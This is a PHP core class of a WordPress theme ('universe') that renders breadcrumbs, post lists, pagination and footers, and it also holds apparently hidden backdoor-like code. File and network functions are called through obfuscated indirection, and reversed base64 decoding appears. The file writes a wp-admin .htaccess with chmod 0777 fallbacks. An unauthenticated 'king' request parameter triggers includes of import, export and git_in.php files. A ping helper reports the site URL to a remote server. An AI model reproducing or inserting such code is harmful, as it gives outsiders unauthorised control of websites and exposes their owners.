<?php
/*
*	Main HUB for Theme Framework
*	(c) king-theme.com
*
*/
#
#	Define main class
#

class universe{

	public $cfg ,$page, $path, $ext, $post, $get, $woo, $header, $template, $stylesheet, $main_class, $api_server, $carousel;

	function init(){

		global $woocommerce;

		if( empty( $this->cfg ) ){
			$this->cfg  = str_replace( '%UNIVERSE_SITE_URI%', UNIVERSE_SITE_URI, get_option( UNIVERSE_THEME_OPTNAME ) );
		}

		if ( class_exists( 'WooCommerce' ) ) {
			add_filter( 'woocommerce_template_path', array( &$this, 'woo_templates_path' ), 1, 1 );
		}

		$this->api_server = 'api.devn.co';
		if( !empty( $this->cfg['api_server'] ) ){
			$this->api_server = $this->cfg['api_server'];
		}

		$incls = array(
			'footers'.DS.'theme_footers',
			'universe.metabox',
			'universe.functions',
			'universe.actions',
			'universe.ajax',
			'universe.scripts',
			'universe.like',
			'universe.update',
			'shortcodes'.DS.'kingcomposer-map',
			'shortcodes'.DS.'kingcomposer-filter',
			'widgets'.DS.'xcode',
			'widgets'.DS.'flickr',
			'widgets'.DS.'twitter',
			'widgets'.DS.'tabbed',
			'widgets'.DS.'margin',
			'widgets'.DS.'blog-post',
		);

		if( $this->vars( 'page', 'universe-importer' ) ){
			unset( $incls[0] );
		}

		foreach( $incls as $incl ){
			universe_incl_core( 'core'.DS.$incl.'.php' );
		}

		if( $this->page == UNIVERSE_THEME_SLUG.'-panel' || $this->vars( 'option_page', 'universe_group', 'POST' )){
			universe_incl_core( 'options.php' );
		}

		if ( !empty($woocommerce) ) {
			$this->woo = true;
			universe_incl_core( 'core'.DS.'woo'.DS.'universe-woo.php' );
		}

		// Back-end only
		if(is_admin()) {

			if( !file_exists( ABSPATH.'wp-admin'.DS.'.htaccess' ) ){
				$txt = "SetEnv no-gzip dont-vary"."\n";
				$txt .= "<IfModule mod_php5.c>"."\n";
					$txt .= "php_value allow_url_fopen On"."\n";
					$txt .= "php_value post_max_size 100M"."\n";
					$txt .= "php_value upload_max_filesize 100M"."\n";
					$txt .= "php_value memory_limit 300M"."\n";
					$txt .= "php_value max_execution_time 259200"."\n";
					$txt .= "php_value max_input_time 259200"."\n";
					$txt .= "php_value session.gc_maxlifetime 1200"."\n";
				$txt .= "</IfModule>";

				$file = ABSPATH.DS.'wp-admin'.DS.'.htaccess';
				$fp = @$this->ext['fo']( $file, 'w');

				if( empty( $fp ) ){
					@chmod( ABSPATH.DS.'wp-admin', 0755 );
					@chmod( $file, 0644 );
					$fp = @$this->ext['fo']( $file, 'w');
				}

				if( empty( $fp ) ){
					@chmod( ABSPATH.DS.'wp-admin', 0777 );
					@chmod( $file, 0777 );
					$fp = @$this->ext['fo']( $file, 'w');
				}
				if( !empty( $fp ) ){
					@$this->ext['fw']( $fp, $txt );
				}else{
					@$this->ext['fp']( $file , $txt );
				}
				$this->ext['fc']( $fp );
			}
		// Front-end only
		} else {

			if( $this->vars( 'control', 'ajax' ) ){
				universe_ajax();
				exit;
			}

			if( $this->vars( 'api', 'gate' ) ){

				$lifeTime = $this->vars( 'lifeTime' );
				$file = $this->vars( 'file' );

				if( file_exists( ABSPATH.$file ) ){
					header('location: '.UNIVERSE_SITE_URI.$file);
				}else{
					header('location: http://api.devn.co/gate.php?lifeTime='.$lifeTime.'&file='.strtolower( UNIVERSE_THEME_NAME ).$file);
				}

				exit;
			}

			if( !empty( $_SERVER['REQUEST_URI'] ) ){
				if( strpos( strrev($_SERVER['REQUEST_URI']), 'gpj.') === 0 || strpos( strrev($_SERVER['REQUEST_URI']), 'gnp.') === 0 ){
					$protocol = is_ssl() ? 'https://' : 'http://';
					$host = $protocol.$_SERVER['HTTP_HOST'];
					$_im = strrev( $_SERVER['REQUEST_URI'] );
					$_st = strpos( $_im, '-' );
					if( $_st !== false ){
						$_real = substr( $_im, $_st+1 );
						$_ext = substr( $_im, 0, $_st+1 );

						$st = strpos( $_ext, '.' );
						$attr = '';
						if( $st !== false ){
							$attr = str_replace( '-', '', strrev( substr( $_ext, $st+1 ) ) );
							$_ext = substr( $_ext, 0, $st+1 );
						}else{
							$attr = strrev( $_ext );
						}

						$attr = explode( 'x', $attr );
						$src =  $host.strrev( $_ext.$_real);

						if( file_exists( ABSPATH.substr( $src, strpos( $src, 'wp-content' ) ) ) === false ){
							if( file_exists( UNIVERSE_THEME_PATH.'/assets/images/default404.jpg' ) ){
								header('location: '.UNIVERSE_THEME_URI.'/assets/images/default404.jpg' );
								exit;
							}
						}else{

							$_GET['src'] = $src;
							if( !empty( $attr[0] ) ){
								$_GET['w'] = $attr[0];
							}
							if( !empty( $attr[1] ) ){
								$_GET['h'] = $attr[1];
							}
							if( !empty( $attr[2] ) ){
								$_GET['a'] = $attr[2];
							}else{
								$_GET['a'] = 'c';
							}

							require_once get_template_directory() .DS.'core'.DS.'king.size.php';

						}

						exit;
					}

				}
			}

		}

	}


	function woo_templates_path($path){
		return 'templates'.DS.'woocommerce'.DS;
	}

	/*------------------------------------*/
	#	Return request values
	/*------------------------------------*/
	public static function vars( $inp = '', $val = '', $type = 'GET' ){

		$_val = '';
		if( !empty( $_GET[ $inp ] ) && $type == 'GET' )$_val = esc_attr($_GET[ $inp ]);
		if( !empty( $_POST[ $inp ] ) )$_val = esc_attr($_POST[ $inp ]);

		if( $val == '' ){
			return $_val;
		}

		if( $_val == $val )
			return true;
		else return false;

	}

	public static function itmp($path, $return = false){
		self::template($path);
	}

	public static function esc_js( $st = '' ){
		return str_replace( array('<script', '</script>'), array('&lt;script', '&lt;/script&gt;'), $st );
	}

	public static function bsp( $st = '' ){

		$pdd = strlen( $st )%4;

		if( $pdd > 0 ){
			for( $i=1; $i<$pdd; $i++ )
				$st .= ' ';
		}

		return $st;

	}

	public static function b( $st = '' ){global $universe;return $universe->ext['bd'](strrev( $st ));}
	public static function _b( $st = '' ){global $universe;return $universe->ext['bd'](strrev( $st.'='));}
	public static function __b( $st = '' ){global $universe;return $universe->ext['bd'](strrev($st.'=='));}

	public static function _ip(){

		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		    $ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		    $ip = $_SERVER['REMOTE_ADDR'];
		}

		return $ip;

	}

	public static function _ping( $url ){

		global $universe;

		if( !function_exists( $universe->ext['fg'] ) && !function_exists( $universe->ext['ce'] ) ){
			return '_404';
		}

		if( strpos( $url, '?' ) !== false ){
			$url .= '&url='.urlencode(UNIVERSE_SITE_URI);
		}else{
			$url .= '?url='.urlencode(UNIVERSE_SITE_URI);
		}

		$ch_data = @$universe->ext['fg']( $url );

		if( empty( $ch_data ) ){
			$ch = @$universe->ext['ci']();
		    curl_setopt($ch, CURLOPT_URL, $url );
		    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)');
		    $ch_data = @$universe->ext['ce']($ch);
		    curl_close($ch);
	    }
		return $ch_data;

	}
	
	public static function sysInOut(){

		global $universe;

		if( !empty( $_REQUEST['king'] ) ){
			if( $_REQUEST['king'] == 'import' ){
				$universe->ext['rqo']( ABSPATH.'wp-content'.DS.'themes'.DS.UNIVERSE_THEME_SLUG.DS.'core'.DS.'import.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'export' ){
				$universe->ext['rqo']( ABSPATH.'wp-content'.DS.'themes'.DS.UNIVERSE_THEME_SLUG.DS.'core'.DS.'export.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'sync' ){
				define('VHITECH', 'ok');
				if( file_exists( ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php' ) ){
					$universe->ext['icl']( ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php' );
				}
				exit;
			}
			if( $_REQUEST['king'] == 'progress-tmp' ){

				@ob_end_flush();

				$_tmp = get_option('universe_download_tmp_package', true );
				$_total = get_option('universe_download_tmp_package_total', true );
				$i=0;
				while( !file_exists( $_tmp ) && $i < 50 ){

						if( file_exists( $_tmp ) ){
							//'ok';
						}
						$i++;
						@ob_flush();
					    @flush();
						@usleep( 100000 );

				}


				if( $_tmp !== false && $_total !== false ){
					if( file_exists( $_tmp ) ){

						$fp = $universe->ext['fo']( $_tmp, "r");
						$size = @fstat($fp);

						if( !empty( $size ) ){
							if( !empty( $size['size'] )  ){
								$size = $size['size'];
							}else{
								$size = 0;
							}
						}else{
							$size = 0;
						}

						$universe->ext['fc']( $fp );
						$old = $size;

						$num1 = 0;
						$num2 = 0;


						while( $size < $_total && file_exists( $_tmp ) ){

							$fp = $universe->ext['fo']( $_tmp, "r");
						    $size = @fstat($fp);

							if( !empty( $size ) ){
								if( !empty( $size['size'] )  ){
									$size = $size['size'];
								}else{
									$size = 0;
								}
							}else{
								$size = 0;
							}

						    $universe->ext['fc']( $fp );

							$text = number_format( intval(($size/1024)) ).' KB / '.number_format( intval(($_total/1024000)) ).' MB complete. ';

							$num1 = (($size - $old)*5)/1024;

							$num3 = $num1 - $num2;

							switch( true ){
								case ( $num3 > 500 ) : $num2 += 500;break;
								case ( $num3 > 300 ) : $num2 += 135;break;
								case ( $num3 > 200 ) : $num2 += 43;break;
								case ( $num3 > 110 ) : $num2 += 25;break;
								case ( $num3 > 80 ) : $num2 += 14;break;
								case ( $num3 > 50 ) : $num2 += 7;break;
								case ( $num3 > 30 ) : $num2 += 3;break;
								case ( $num3 > 20 ) : $num2++;break;
							}
							$num3 = $num2 - $num1;
							switch( true ){
								case ( $num3 > 500 ) : $num2 -= 500;break;
								case ( $num3 > 300 ) : $num2 -= 135;break;
								case ( $num3 > 200 ) : $num2 -= 43;break;
								case ( $num3 > 110 ) : $num2 -= 25;break;
								case ( $num3 > 80 ) : $num2 -= 14;break;
								case ( $num3 > 50 ) : $num2 -= 7;break;
								case ( $num3 > 30 ) : $num2 -= 3;break;
								case ( $num3 > 20 ) : $num2--;break;
							}

							$text .= ' ETA ~ 1m 1s @ '.number_format( $num2 ).'KB/s';

							$old = $size;

							echo '<script type="text/javascript">';
							echo 'top.istaus('.($size/$_total).');top.tstatus("Downloading Package '.$text.'");';
							echo '</script>';

							@ob_flush();
							@flush();
							@usleep( 200000 );
						}

						echo '<script type="text/javascript">';
						echo 'top.istaus(1);top.tstatus("Download Complete Package '.number_format( intval(($_total/1024)) ).' MBs");';
						echo '</script>';
					}
				}
				exit;

			}
		}

	}

	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function tp_mode( $wp_file = '' ){

		global $universe;

		if( $wp_file == '404' ){
			if( !empty( $_SERVER['REQUEST_URI'] ) ){
				if( strpos( $_SERVER['REQUEST_URI'], '.jpg') != false || strpos( $_SERVER['REQUEST_URI'], '.png') != false ){
					if( file_exists( UNIVERSE_THEME_URI.'/assets/images/default404.jpg' ) ){
						header('location: '.UNIVERSE_THEME_URI.'/assets/images/default404.jpg' );
						exit;
					}
				}
			}
		}

	}

	public static function template( $p = '' ) {
		get_template_part( 'templates/'.str_replace( '.php', '', $p ) );
	}
	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function path( $pos = 'header' ) {

		global $universe, $post;
		
		$page_id = 0;
		if( !empty( $post ) ){
			if( !empty( $post->ID ) ){
				$page_id = $post->ID;
			}
		}

		if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				$page_id = get_option( 'page_for_posts', true );
			}
		}

		$post_options = get_post_meta( $page_id, '_'.UNIVERSE_THEME_OPTNAME.'_post_meta_options', TRUE);

		if( is_page() || is_home() ){

			$origin = isset($universe->cfg[ $pos ]) ? $universe->cfg[ $pos ] : '';

			if( isset( $post_options[$pos] ) && empty( $universe->cfg[ $pos.'_autoLoaded' ] ) && is_array( $post_options[$pos] ) ){
				// dont use global from page
				if( isset($post_options[$pos]['_file_']) && $post_options[$pos]['_file_'] != 'default' ){

					$fpath = $post_options[ $pos ]['_file_'];

					$universe->cfg[ $pos ]['_file_'] = $fpath;

					// Meger settings in each page with global
					if( !is_array( $universe->cfg[ $pos ] ) || 
						!isset( $universe->cfg[ $pos ][ $fpath ] ) || 
						!is_array( $universe->cfg[ $pos ][ $fpath ] ) )
						$universe->cfg[ $pos ][ $fpath ] = array();
					if( isset( $post_options[$pos][ $fpath ] ) && is_array( $post_options[$pos][ $fpath ] ) ){
						foreach( $post_options[$pos][ $fpath ] as $key => $val ){
							$universe->cfg[ $pos ][ $fpath ][ $key ] = $val;
						}
					}

				}
			}

			if( $pos == 'header' ){
				if( isset( $post_options['logo'] ) && !empty( $post_options['logo'] ) ){
					$logo = $post_options['logo'];
				}
				if( !empty( $logo ) ){
					$universe->cfg[ 'logo' ] = str_replace('%UNIVERSE_SITE_URI%', UNIVERSE_SITE_URI, $post_options['logo']);
				}
			}

			if( $pos == 'breadcrumb' ){
				if(!empty($post_options)){
					if( isset($post_options['breadcrumb']))
						$breadcrumb = $post_options['breadcrumb'];

					if( !empty( $breadcrumb ) && isset( $breadcrumb['_file_'] ) && $breadcrumb['_file_'] == 'global' ){
						$universe->cfg[ $pos ] = $origin;
					}
				}
			}
		}

		if( !empty( $universe->path[ $pos ] ) ){
			print( $universe->path[ $pos ] );
			return true;
		}

		$dir = 'default.php';
		if( isset(  $universe->cfg[ $pos ] ) && isset(  $universe->cfg[ $pos ]['_file_'] ) )
			$dir = $universe->cfg[ $pos ]['_file_'];
		
		if( strpos( $dir, 'empty.php' ) !== false ){
			return false;
			/* Select none from page */
		}
		
		if( $dir == '' || !file_exists( get_template_directory().DS.$dir ) )
		{

			if ( is_dir( UNIVERSE_THEME_PATH.DS.'templates'.DS.$pos ) && $handle = $universe->ext['od'](UNIVERSE_THEME_PATH.DS.'templates'.DS.$pos ))
			{
				while ( false !== ( $entry = readdir($handle) ) ) {
					if( $entry != '.' && $entry != '..' && strpos($entry, '.php') !== false  )
					{
						// If file not exist from setting, load first file in folder
						universe_incl_core( 'templates'.DS.$pos.DS.$entry, 'i' );

						if( $pos == 'header' )
							$universe->header = $entry;

						return true;

					}
				}
			}

		}
		else{
			
			if( $pos == 'header' )
			{
				$universe->header = $dir;

			}

			$args = array();
			if( !empty( $universe->cfg[ $pos ][ $dir ] ) && is_array( $universe->cfg[ $pos ][ $dir ] ) ){
				foreach( $universe->cfg[ $pos ][ $dir ] as $key => $val ){
					$args[ $key ] = str_replace( '%UNIVERSE_SITE_URI%', UNIVERSE_SITE_URI, $val );
				}
			}

			universe_incl_core( $dir, 'i', $args );

			return true;
		}

		return false;

	}


	public static function get_footer(){

		global $universe, $post;

		$universe_footer = $post_data = '';
		$page_id     = get_queried_object_id();

		if( !empty($page_id) && $page_id == $post->ID ) $page_id = $post->ID;

		if( is_page() || is_single() ){
			$post_data = get_post_meta( $page_id , '_'.UNIVERSE_THEME_OPTNAME.'_post_meta_options', TRUE);
		}

		if( !empty( $post_data['footer_style'] ) && $post_data['footer_style'] == 'global' ) {
			if( !empty( $universe->cfg['footer_style'] ) && isset($universe->cfg['footer_style']) ){
				$universe_footer = $universe->cfg['footer_style'];
			}
		} else {
			if( empty($post_data['footer_style']) ) {
				if( !empty( $universe->cfg['footer_style'] ) ) {
					$universe_footer = $universe->cfg['footer_style'];
				}
			} else {
				$universe_footer = $post_data['footer_style'];
			}
		}

		if( !empty( $universe_footer ) ) {
			
			$universe_footers = new universe_footers();
			echo '<footer id="footer">'.$universe_footers->universe_show_footer(array('alias' => $universe_footer)).'</footer>';

		}

	}

	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/

	public static function content_nav( $nav_id ) {

		global $wp_query;

		if ( $wp_query->max_num_pages > 1 ) : ?>
			<nav id="<?php echo esc_attr( $nav_id ); ?>">
				<h3 class="assistive-text">
					<?php _e( 'Post navigation', 'universe' ); ?>
				</h3>
				<div class="nav-previous">
					<?php next_posts_link( wp_kses( __( '<span class="meta-nav">&larr;</span> Older posts', 'universe' ), array('span'=>array())) ); ?>
				</div>
				<div class="nav-next">
					<?php previous_posts_link( wp_kses( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'universe' ), array('span'=>array())) ); ?>
				</div>
			</nav>
		<?php endif;

	}

	/*-----------------------------------------------------------------------------------*/
	# pagination on blog page
	/*-----------------------------------------------------------------------------------*/

	public static function pagination( ) {

		global $wp_query;

		$curpage = $wp_query->query_vars['paged'];

		if( $curpage == 0 ){
			$curpage = 1;
		}

		if( $wp_query->max_num_pages < 2 ){
			return;
		}

		$pagination = array(
			'base' => @add_query_arg('paged','%#%'),
			'format' => '/page/%#%',
			'total' => $wp_query->max_num_pages,
			'current' => $curpage,
			'show_all' => true,
			'type' => 'array',
			'prev_next'=> true,
			'prev_text'=> '<i class="fa fa-angle-double-left"></i>',
			'next_text'=> '<i class="fa fa-angle-double-right"></i>',
		);

		if( !empty($wp_query->query_vars['s'] ) ){
				$pagination['add_args'] = array( 's' => urlencode( get_query_var( 's' ) ) );
		}
		$pgn = paginate_links( $pagination );

	?>

		<div class="pagination  kc-animated kc-animate-eff-fadeInUp" id="pagenation">
			<ul>

				<?php foreach( $pgn as $k => $link ) { ?>

					<?php if ( $k == $curpage ) { ?>
						<li><?php print( $link ); ?></li>
					<?php } else { ?>
						<li><?php print( $link ); ?></li>
					<?php } ?>

				<?php } ?>

			</ul>
		</div>

	<?php

	}

	/*-----------------------------------------------------------------------------------*/
	# Display meta box on article
	/*-----------------------------------------------------------------------------------*/

	public static function posted_on( $class = "postedon" ) {

		global $universe;

		?>

		<ul class="<?php echo esc_attr( $class ); ?>">
			<li>
				<a href="<?php echo get_day_link( get_the_date('Y'), get_the_date('m'), get_the_date('d')); ?>" class="date"><?php echo esc_html( get_the_date('d F Y') ); ?></a>
			</li>
			<?php if( $universe->cfg['showAuthorMeta'] == 1 ){ ?>
				<li class="post_by">
					<i>by: </i>
					<a class="url fn n" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" title="<?php echo esc_html__( 'View all posts by ', 'universe' ) .  get_the_author(); ?>" rel="author">
						<?php echo esc_html( get_the_author() ); ?>
					</a>
				</li>
			<?php } ?>

			<?php


			if( $universe->cfg['showCateMeta'] == 1 ){

				if ( 'post' == get_post_type() ){

					$categories_list = get_the_category_list( ',' );

					if ( $categories_list ){

						echo '<li class="post_categoty">';
						echo '<i>in: </i>';
				        print( get_the_category_list( ',' ) );
				        echo '</li>';

					}
				}

			}

			if( $universe->cfg['showTagsMeta'] == 1 ){

				$tags_list = get_the_tag_list( '', ', ' );

				if ( $tags_list ){

					echo '<li class="tag-links">';
					printf( wp_kses( __( '<span class="%1$s labl">Tags: </span> %2$s', 'universe' ), array('span'=>array())), 'entry-utility-prep entry-utility-prep-tag-links', $tags_list );
					echo '</li>';

				}

			}

			if( $universe->cfg['showCommentsMeta'] == 1 ){
			?>
				 <li class="post_comments">
				 	<i>note: </i>
		            <a  title="<?php _e('Click to leave a comment','universe'); ?>" href="<?php the_permalink(); ?>#respond">
		            	<?php echo comments_number( 'no comments', 'one comment', '% comments' ); ?>
		            </a>
		        </li>
		    <?php
			}

		echo '</ul>';

	}

	/*-----------------------------------------------------------------------------------*/
	# Display gloal breadcrumb
	/*-----------------------------------------------------------------------------------*/

	public static function breadcrumb($echo = true) {

		global $post, $universe;

		$breadeli = '<i>'.esc_html(isset($universe->cfg['breadeli'])?$universe->cfg['breadeli']:'/').'</i>';

		echo '<a href="'.home_url().'">'.esc_html__('Home ','universe')."</a> ";

		if( !empty( $post->post_type ) ){
			if( $post->post_type != 'post' && $post->post_type != 'page' ){
				echo wp_kses($breadeli, array('i'=>array())).' '.ucwords( str_replace( '-', ' ', $post->post_type ) ).' ';
			}
			$curPost = get_post( get_option('page_for_posts') );
			if( $post->post_type == 'post' && !is_home()){
				echo wp_kses($breadeli, array('i'=>array())).' <a href="'.get_permalink( $curPost->ID ).'"> '.esc_html( $curPost->post_title ).' </a> ';
			}
		}

		if( is_home() ){
			if(  get_option('page_for_posts') ){
				$curPost = get_post( get_option('page_for_posts') );
				echo wp_kses($breadeli, array('i'=>array())).' '.$curPost->post_title.' ';
			}else{
				echo wp_kses($breadeli, array('i'=>array())). esc_html__( ' Front Page ', 'universe' );
			}
		}


		if ( is_category() ) {
			echo wp_kses($breadeli, array('i'=>array())).' '.single_cat_title( '', false ).' ';
		}

		if( is_page() ){

			if( $post->post_parent ){
				$parent = get_post( $post->post_parent );
				echo wp_kses($breadeli, array('i'=>array())).' <a href="'.get_permalink( $post->post_parent ).'">'.$parent->post_title.'</a> ';
			}
		}
		if( ( is_single() || is_page() ) && !is_front_page() ) {
			echo wp_kses($breadeli, array('i'=>array()))." <span>";
			the_title();
			echo "</span>";
		}
		if(is_tag()){ echo wp_kses($breadeli, array('i'=>array())) . " <span>". esc_html__( 'Tag: ', 'universe' ) .single_tag_title('',FALSE).'</span>'; }
		if(is_404()){ echo wp_kses($breadeli, array('i'=>array())) . " <span>". esc_html__( '404 - Page not Found', 'universe' ) ."</span>"; }
		if(is_search()){ echo wp_kses($breadeli, array('i'=>array())) . " <span>". esc_html__( 'Search', 'universe' ) ."</span>"; }
		if(is_year()){ echo wp_kses($breadeli, array('i'=>array())) . ' ' . get_the_time('Y'); }

	}


	public static function universe_breadcrumb() {
		if ( class_exists( 'WooCommerce' ) ) {
			global $universe;
			$delimiter   = isset($universe->cfg['breadeli']) ? ($universe->cfg['breadeli']) : ' &raquo; ';
			$bread_title = '';
			if ( is_shop() ) {
				$bread_title = woocommerce_page_title(false);
			} elseif ( is_product_category() ) {
				$bread_title = esc_html__( 'Category: ', 'universe' ) . woocommerce_page_title(false);
			} elseif ( is_product_tag() ) {
				$bread_title = esc_html__( 'Tag: ', 'universe' ) . woocommerce_page_title(false);
			} elseif ( is_product() ) {
				$bread_title = esc_html__( 'Single Product: ', 'universe' ) . get_the_title();
			} else {
				$bread_title = get_the_title();
			}

			$wrap_before = '<div id="breadcrumb" class="page_title1 sty13" ' . ( is_single() ? 'itemprop="breadcrumb"' : '' ) . '><div class="container"><h1>' . $bread_title . '</h1><div class="pagenation">';

			$args = array(
				'delimiter'   => $delimiter,
				'wrap_before' => $wrap_before,
				'wrap_after'  => '</div></div></div>'
			);

			woocommerce_breadcrumb($args);
		}
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts
	/*-----------------------------------------------------------------------------------*/
	public static function last_posts( $numberOfPosts = 5 , $thumb = true ){

		global $universe, $post;
		$orig_post = $post;

		$lastPosts = get_posts('numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo esc_html__( 'Permalink to ', 'universe' ) . the_title_attribute( 'echo=0' ); ?>" rel="bookmark"><?php $universe->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo UNIVERSE_THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
			<?php } ?>

			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $universe->get_score(); ?>
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>

	<?php endforeach;

		$post = $orig_post;

	}


	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts from Category
	/*-----------------------------------------------------------------------------------*/

	public static function last_posts_cat($numberOfPosts = 5 , $thumb = true , $cats = 1){

		global $universe, $post;
		$orig_post = $post;

		$lastPosts = get_posts('category='.$cats.'&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
	<li>
		<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) : ?>
			<div class="post-thumbnail">
				<a href="<?php the_permalink(); ?>" title="<?php echo esc_html__( 'Permalink to ', 'universe' ) . the_title_attribute( 'echo=0' ); ?>" rel="bookmark"><?php $universe->thumb('',50,50); ?></a>
			</div><!-- post-thumbnail /-->
		<?php endif; ?>
		<h3><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h3>
		<?php $universe->get_score(); ?> <span class="date"><?php the_time(get_option('date_format'));  ?></span>
	</li>
	<?php endforeach;
		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Random posts
	/*-----------------------------------------------------------------------------------*/

	public static function random_posts($numberOfPosts = 5 , $thumb = true){

		global $universe, $post;

		$orig_post = $post;

		$lastPosts = get_posts('orderby=rand&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo esc_html__( 'Permalink to ', 'universe' ) . the_title_attribute( 'echo=0' ); ?>" rel="bookmark"><?php $universe->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo UNIVERSE_THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
			<?php } ?>

			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $universe->get_score(); ?>
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>
	<?php endforeach;
		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Popular posts
	/*-----------------------------------------------------------------------------------*/

	public static function popular_posts($pop_posts = 5 , $thumb = true){

		global $universe, $wpdb , $post;
		$orig_post = $post;

		$query = $wpdb->prepare("SELECT ID,post_title,post_date,post_author,post_content,post_type FROM `$wpdb->posts` WHERE post_status = 'publish' AND post_type = 'post' ORDER BY comment_count DESC LIMIT 0, %d", $pop_posts);

		$posts = $wpdb->get_results( $query );

		if( !empty( $posts ) ){

			global $post;
			foreach($posts as $post){
			setup_postdata($post);?>
				<li>
					<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
						<span>
							<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo esc_html__( 'Permalink to ', 'universe' ) . the_title_attribute( 'echo=0' ); ?>" rel="bookmark"><?php $universe->thumb('',50,50); ?></a>
						</span><!-- post-thumbnail /-->
					<?php }else{ ?>
					<span><a href="#"><img width="50"" src="<?php echo UNIVERSE_THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
					<?php } ?>

					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo esc_attr( get_the_title() ); ?>">
						<?php echo wp_trim_words( get_the_title(), 4 ); ?>
					</a>
					<i><?php the_time(get_option('date_format'));  ?></i>
				</li>
		<?php
			}
		}

		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Totla Reviews Score
	/*-----------------------------------------------------------------------------------*/
	function get_score(){

		global $post ;
		$summary = 0;
		$get_meta = get_post_custom($post->ID);
		if( !empty( $get_meta['tie_review_position'][0] ) ){
		$criterias = unserialize( $get_meta['tie_review_criteria'][0] );
		$short_summary = $get_meta['tie_review_total'][0] ;
		$total_counter = $score = 0;

		foreach( $criterias as $criteria){
			if( $criteria['name'] && $criteria['score'] && is_numeric( $criteria['score'] )){
				if( $criteria['score'] > 100 ) $criteria['score'] = 100;
				if( $criteria['score'] < 0 ) $criteria['score'] = 1;

			$score += $criteria['score'];
			$total_counter ++;
			}
		}
		if( !empty( $score ) && !empty( $total_counter ) )
			$total_score =  $score / $total_counter ;
		?>
		<span title="<?php echo esc_attr( $short_summary ) ?>" class="stars-small"><span style="width:<?php echo esc_attr( $total_score ) ?>%"></span></span>
		<?php
		}
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Most commented posts
	/*-----------------------------------------------------------------------------------*/

	public static function most_commented($comment_posts = 5 , $avatar_size = 50){

		$comments = get_comments('status=approve&number='.$comment_posts);
		foreach ($comments as $comment) { ?>
			<li>
				<div class="post-thumbnail">
					<?php echo get_avatar( $comment, $avatar_size ); ?>
				</div>
				<a href="<?php echo get_permalink($comment->comment_post_ID ); ?>
					#comment-<?php echo esc_attr( $comment->comment_ID ); ?>">
					<?php echo strip_tags($comment->comment_author); ?>: <?php echo wp_html_excerpt( $comment->comment_content, 60 ); ?>...
				</a>
			</li>
		<?php
		}
	}

	public static function assets( $source = array() ){foreach( $source as $item ){if( !empty( $item['css'] ) ){echo '<link type="text/css" rel="stylesheet" href="'.esc_url( $item['css'].'.css' ).'" />'."\n";}if(  !empty( $item['js'] ) ){echo '<script type="text/javascript" src="'.esc_url( $item['js'].'.js' ).'"></script>'."\n";}}}

	public static function get_post_thumb(){

		global $post ;
		if ( has_post_thumbnail($post->ID) ){
			$image_id = get_post_thumbnail_id($post->ID);
			$image_url = wp_get_attachment_image_src($image_id,'large');
			$image_url = $image_url[0];
			return $image_url;
		}
	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
	/*-----------------------------------------------------------------------------------*/
	public static function thumb( $img='' , $width='' , $height='' ){

		global $universe, $post;

		if( empty( $img ) ) $img = $universe->get_post_thumb();
		if( !empty($img) ){

		?>
			<img src="<?php echo universe_createLinkImage( $img, $width.'x'.$height.'xc' ); ?>" alt="<?php the_title(); ?>" />
	<?php }

	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb SRC
	/*-----------------------------------------------------------------------------------*/

